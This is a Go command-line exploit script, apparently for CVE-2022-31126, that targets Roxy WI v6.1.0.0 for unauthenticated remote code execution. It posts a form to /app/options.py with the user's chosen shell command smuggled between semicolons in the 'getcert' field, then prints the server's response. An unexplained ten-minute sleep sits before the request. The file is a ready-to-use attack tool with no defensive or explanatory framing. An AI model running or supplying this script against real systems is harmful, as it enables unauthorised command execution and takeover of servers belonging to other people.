package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"time"

	"github.com/akamensky/argparse"
)

type ExploitConfig struct {
	IP  string
	Cmd string
}

func exploit(config ExploitConfig) (bool, error) {
	targetURL := fmt.Sprintf("http://%s/app/options.py", config.IP)

	data := url.Values{
		"show_versions":  {"1"},
		"token":          {""},
		"alert_consumer": {"1"},
		"serv":           {"127.0.0.1"},
		"getcert":        {";" + config.Cmd + ";"},
	}

	resp, err := http.PostForm(targetURL, data)
	if err != nil {
		return false, fmt.Errorf("error sending POST request: %w", err)
	}
	defer resp.Body.Close()

	fmt.Printf("Response Status: %s\n", resp.Status)
	if resp.StatusCode == http.StatusOK {
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return false, fmt.Errorf("error reading response body: %w", err)
		}
		fmt.Println(string(body))
		return true, nil
	}

	return false, nil
}

func isValidIPv4(ip string) bool {
	ipv4Regex := `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`
	match, _ := regexp.MatchString(ipv4Regex, ip)
	return match
}

func main() {
	parser := argparse.NewParser("cve2022-31126", "Roxy WI v6.1.0.0 - Unauthenticated Remote Code Execution (RCE)")
	ip := parser.String("i", "ip", &argparse.Options{Required: true, Help: "IP address of the CMS"})
	cmd := parser.String("c", "cmd", &argparse.Options{Required: true, Help: "Command to execute"})

	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(1)
	}

	if !isValidIPv4(*ip) {
		log.Fatalf("Invalid IP address format: %s", *ip)
	}

	config := ExploitConfig{
		IP:  *ip,
		Cmd: *cmd,
	}

	fmt.Printf("Running exploit against %s, executing command: %s\n", config.IP, config.Cmd)

	time.Sleep(600 * time.Second)
	success, err := exploit(config)
	if err != nil {
		log.Fatalf("Exploit failed: %v", err)
	}

	if success {
		fmt.Println("Exploit successful!")
	} else {
		fmt.Println("Exploit failed... maybe try again?")
	}
}
